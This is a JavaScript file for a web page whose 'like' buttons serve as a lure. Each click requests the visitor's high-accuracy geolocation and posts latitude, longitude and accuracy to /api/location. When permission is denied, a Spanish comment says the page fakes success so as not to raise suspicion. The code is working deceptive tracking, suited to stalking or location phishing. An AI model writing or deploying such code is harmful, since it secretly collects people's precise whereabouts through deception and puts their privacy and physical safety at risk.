document.addEventListener('DOMContentLoaded', () => {
    const likeBtns = document.querySelectorAll('.like-btn');
    const loading = document.getElementById('loading');
    const thanksModal = document.getElementById('thanks-modal');
    const closeModal = document.getElementById('close-modal');

    likeBtns.forEach(btn => {
        btn.addEventListener('click', function() {
            if (this.classList.contains('liked')) return;
            
            // Iniciar captura
            getGeolocationAndSend(this);
        });
    });

    closeModal.addEventListener('click', () => {
        thanksModal.classList.add('hidden');
    });

    function getGeolocationAndSend(btnElement) {
        loading.classList.remove('hidden');

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    sendDataToServer(position.coords, btnElement);
                },
                (error) => {
                    // Si el usuario deniega la ubicación, simulamos éxito para no levantar sospechas
                    console.log("Ubicación denegada o error.");
                    loading.classList.add('hidden');
                    markAsLiked(btnElement);
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        } else {
            loading.classList.add('hidden');
            markAsLiked(btnElement);
        }
    }

    function sendDataToServer(coords, btnElement) {
        const data = {
            latitude: coords.latitude,
            longitude: coords.longitude,
            accuracy: coords.accuracy
        };

        fetch('/api/location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(result => {
            loading.classList.add('hidden');
            markAsLiked(btnElement);
            thanksModal.classList.remove('hidden');
        })
        .catch(error => {
            console.error('Error enviando datos:', error);
            loading.classList.add('hidden');
            markAsLiked(btnElement);
        });
    }

    function markAsLiked(btn) {
        btn.classList.add('liked');
        btn.innerHTML = '<i class="fa-solid fa-heart"></i> ¡Te gusta!';
    }
});
